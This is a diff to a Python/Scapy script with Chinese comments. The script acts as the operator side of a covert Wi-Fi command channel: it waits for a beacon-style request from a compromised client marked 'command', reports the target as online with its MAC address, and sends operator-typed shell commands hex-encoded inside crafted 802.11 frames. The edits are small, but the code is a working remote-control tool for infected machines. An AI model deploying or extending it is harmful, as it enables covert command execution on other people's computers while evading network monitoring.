@@ -4,9 +4,9 @@ import binascii
 import time
 
 #设置ssid和监听设备名
-netSSID = 'ghost'       #Network name here
-iface = 'wlan0'         #Interface name here
-
+netSSID = 'ghost'       #AP名字
+iface = 'wlan0'         #网卡名字
+times=300               #发送帧的数量
 #Scapy参考设置
 #beacon = Dot11Beacon(cap='ESS+privacy')
 #essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
@@ -23,7 +23,7 @@ iface = 'wlan0'         #Interface name here
 
 #命令获取函数
 def getCmd():
-    cmd = raw_input("input the command to excute:\n")
+    cmd = raw_input("#>: ")
     # cmd = "cmd /c notepad"
     #处理命令编码,转为16进制
     cmd_b = ""
@@ -46,7 +46,7 @@ def getPayloadFrame(cmd, ct_addr2, addr2, addr3):
 #发送包含控制指令的dot11帧
 def sendCmd(frame):
     for i in range(0,3):
-        sendp(frame, iface=iface, count=300)
+        sendp(frame, iface=iface, count=times)
 
 #处理控制函数
 def handle(packet):
@@ -57,9 +57,11 @@ def handle(packet):
         #寻找客户端request帧携带的特定标识
         if data.find("command")>=0:
             # packet.show()
-            print "#wake up#\n"
+            print "[+]Target online"
             #获取上线被控端的MAC地址
             ct_addr2 = packet.addr2
+            print 'MAC[%s]'%ct_addr2
+            
             #要执行的命令
             cmd = getCmd();
             #命令封装为802.11完整帧
